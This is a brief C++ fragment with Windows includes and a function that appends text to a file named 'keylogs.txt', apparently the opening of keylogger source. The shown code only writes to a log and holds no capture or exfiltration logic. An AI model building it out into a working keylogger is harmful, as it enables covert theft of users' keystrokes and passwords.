#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;

void Writelog(LPCSTR text){
    ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text;
    logfile.close();
}